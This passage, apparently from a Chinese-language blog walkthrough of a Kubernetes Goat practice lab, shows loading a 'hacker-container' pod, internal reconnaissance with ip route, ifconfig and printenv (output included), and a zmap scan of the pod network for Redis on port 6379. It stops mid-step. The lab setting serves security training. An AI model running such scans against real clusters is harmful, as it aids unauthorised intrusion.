+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.01.22.png" style="zoom:50%;">
+
+<p>上传到靶场环境：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.02.38.png" style="zoom:50%;">
+
+<p>加载：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> load <span class="token parameter variable">-i</span> hacker-container.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.04.07.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.04.47.png" style="zoom:50%;">
+</blockquote>
+<p>删除hacker-container并重新创建：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> kubectl delete pod hacker-container
+<span class="token function">sudo</span> kubectl run <span class="token parameter variable">-it</span> hacker-container <span class="token parameter variable">--image</span><span class="token operator">=</span>madhuakula/hacker-container --image-pull-policy<span class="token operator">=</span>Never -- <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>需要指定<code>--image-pull-policy=Never</code>参数强制kubectl使用本地镜像。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.11.48.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.12.55.png" style="zoom:50%;">
+
+<p>成功运行<code>hacker-container</code>。</p>
+<h4 id="2）目标"><a href="#2）目标" class="headerlink" title="2）目标"></a>2）目标</h4><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-21%2015.15.07.png" style="zoom:50%;">
+
+<ul>
+<li>攻入secure-middleware命名空间下的（cache-store pod），拿到 <strong>k8s_goat_flag</strong> 。</li>
+</ul>
+<h3 id="3-8-3-实践"><a href="#3-8-3-实践" class="headerlink" title="3.8.3 实践"></a>3.8.3 实践</h3><ul>
+<li>集群网络环境探测</li>
+</ul>
+<p>首先，我们得摸清集群的IP网段。只有掌握了这个，才能用端口扫描器扫遍整个集群，进而知道服务和ip的对应关系。</p>
+<p><strong>几个实用的网络侦查命令</strong>：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> route
+<span class="token function">ifconfig</span>
+<span class="token function">printenv</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~ <span class="token comment"># ip route</span>
+default via <span class="token number">10.244</span>.0.1 dev eth0 
+<span class="token number">10.244</span>.0.0/24 dev eth0 scope <span class="token function">link</span>  src <span class="token number">10.244</span>.0.17 
+<span class="token number">10.244</span>.0.0/16 via <span class="token number">10.244</span>.0.1 dev eth0 
+
+~ <span class="token comment"># ifconfig</span>
+eth0      Link encap:Ethernet  HWaddr 1A:67:40:EB:4D:BA  
+          inet addr:10.244.0.17  Bcast:10.244.0.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1
+          RX packets:24 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:3072 <span class="token punctuation">(</span><span class="token number">3.0</span> KiB<span class="token punctuation">)</span>  TX bytes:42 <span class="token punctuation">(</span><span class="token number">42.0</span> B<span class="token punctuation">)</span>
+          
+~ <span class="token comment"># printenv</span>
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.102</span>.202.149
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.102</span>.119.162
+<span class="token assign-left variable">KUBERNETES_PORT</span><span class="token operator">=</span>tcp://10.96.0.1:443
+<span class="token assign-left variable">METADATA_DB_PORT</span><span class="token operator">=</span>tcp://10.99.22.157:80
+<span class="token assign-left variable">METADATA_DB_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">KUBERNETES_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">443</span>
+<span class="token assign-left variable">ETCDCTL_VERSION</span><span class="token operator">=</span><span class="token number">3.4</span>.9
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
+<span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>hacker-container
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.105</span>.18.49
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">HELMV2_VERSION</span><span class="token operator">=</span><span class="token number">2.16</span>.7
+<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
+<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
+<span class="token assign-left variable">METADATA_DB_PORT_80_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.99</span>.22.157
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.102.202.149:80
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP</span><span class="token operator">=</span>tcp://10.100.116.234:3000
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.100</span>.116.234
+<span class="token assign-left variable">METADATA_DB_PORT_80_TCP_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.107</span>.180.113
+<span class="token assign-left variable">METADATA_DB_PORT_80_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.102</span>.119.162
+<span class="token assign-left variable">AUDIT2RBAC_VERSION</span><span class="token operator">=</span><span class="token number">0.8</span>.0
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT_5000_TCP</span><span class="token operator">=</span>tcp://10.102.119.162:5000
+<span class="token assign-left variable">POPEYE_VERSION</span><span class="token operator">=</span><span class="token number">0.9</span>.0
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.102</span>.202.149
+<span class="token assign-left variable">HADOLINT_VERSION</span><span class="token operator">=</span><span class="token number">2.10</span>.0
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.100.116.234:3000
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT_80_TCP</span><span class="token operator">=</span>tcp://10.105.18.49:80
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
+<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.97</span>.177.195
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.102.119.162:5000
+<span class="token assign-left variable">POOR_REGISTRY_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
+<span class="token assign-left variable">KUBERNETES_PORT_443_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.96</span>.0.1
+<span class="token assign-left variable">METADATA_DB_PORT_80_TCP</span><span class="token operator">=</span>tcp://10.99.22.157:80
+<span class="token assign-left variable">KUBESEC_VERSION</span><span class="token operator">=</span><span class="token number">2.11</span>.4
+<span class="token assign-left variable">KUBEAUDIT_VERSION</span><span class="token operator">=</span><span class="token number">0.18</span>.0
+<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.107</span>.180.113
+<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP</span><span class="token operator">=</span>tcp://10.107.180.113:5000
+<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">KUBERNETES_PORT_443_TCP_PORT</span><span class="token operator">=</span><span class="token number">443</span>
+<span class="token assign-left variable">KUBERNETES_PORT_443_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">HELM_VERSION</span><span class="token operator">=</span><span class="token number">3.2</span>.2
+<span class="token assign-left variable">KUBECTL_WHOCAN_VERSION</span><span class="token operator">=</span><span class="token number">0.4</span>.0
+<span class="token assign-left variable">KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP</span><span class="token operator">=</span>tcp://10.102.202.149:80
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.108</span>.181.246
+<span class="token assign-left variable">METADATA_DB_SERVICE_PORT_HTTP</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.108</span>.181.246
+<span class="token assign-left variable">AMICONTAINED_VERSION</span><span class="token operator">=</span><span class="token number">0.4</span>.9
+<span class="token assign-left variable">KUBECTL_VERSION</span><span class="token operator">=</span><span class="token number">1.24</span>.0
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.107.180.113:5000
+<span class="token assign-left variable">INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">5000</span>
+<span class="token assign-left variable">DOCKER_VERSION</span><span class="token operator">=</span><span class="token number">19.03</span>.9
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PORT</span><span class="token operator">=</span><span class="token number">8080</span>
+<span class="token assign-left variable">CFSSL_VERSION</span><span class="token operator">=</span><span class="token number">1.6</span>.1
+<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT_3000_TCP</span><span class="token operator">=</span>tcp://10.97.177.195:3000
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PROTO</span><span class="token operator">=</span>tcp
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.105</span>.18.49
+<span class="token assign-left variable">AMASS_VERSION</span><span class="token operator">=</span><span class="token number">3.6</span>.3
+<span class="token assign-left variable">CONFTEST_VERSION</span><span class="token operator">=</span><span class="token number">0.21</span>.0
+<span class="token assign-left variable">BUILD_CODE_SERVICE_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.97</span>.177.195
+<span class="token assign-left variable">KUBERNETES_PORT_443_TCP</span><span class="token operator">=</span>tcp://10.96.0.1:443
+<span class="token assign-left variable">KUBERNETES_SERVICE_PORT_HTTPS</span><span class="token operator">=</span><span class="token number">443</span>
+<span class="token assign-left variable">KUBERNETES_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.96</span>.0.1
+<span class="token assign-left variable">METADATA_DB_SERVICE_HOST</span><span class="token operator">=</span><span class="token number">10.99</span>.22.157
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">8080</span>
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.108.181.246:8080
+<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/root
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_ADDR</span><span class="token operator">=</span><span class="token number">10.100</span>.116.234
+<span class="token assign-left variable">KUBEBENCH_VERSION</span><span class="token operator">=</span><span class="token number">0.3</span>.0
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">HEALTH_CHECK_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.105.18.49:80
+<span class="token assign-left variable">GITLEAKS_VERSION</span><span class="token operator">=</span><span class="token number">8.8</span>.11
+<span class="token assign-left variable">TLDR_VERSION</span><span class="token operator">=</span><span class="token number">0.6</span>.1
+<span class="token assign-left variable">BUILD_CODE_SERVICE_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
+<span class="token assign-left variable">INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PORT</span><span class="token operator">=</span><span class="token number">3000</span>
+<span class="token assign-left variable">BUILD_CODE_SERVICE_PORT</span><span class="token operator">=</span>tcp://10.97.177.195:3000
+<span class="token assign-left variable">SYSTEM_MONITOR_SERVICE_PORT_8080_TCP</span><span class="token operator">=</span>tcp://10.108.181.246:8080
+~ <span class="token comment"># </span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>服务探测</li>
+</ul>
+<p>收集到网络信息后，用 <strong>zmap</strong> 对集群整个网段进行内网扫描，重点关注 <strong>6379 端口</strong>（Redis 默认端口——假设缓存服务用的是 Redis。不过测试时可别局限于此，实战中 ElasticSearch、MongoDB、MySQL 这些内部服务一抓一大把）。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zmap <span class="token parameter variable">-p</span> <span class="token number">6379</span> <span class="token number">10.244</span>.0.0/16 <span class="token parameter variable">-o</span> results.csv <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>需要调整zmap的配置文件，因为zmap默认不扫10.0.0.0/8</p>
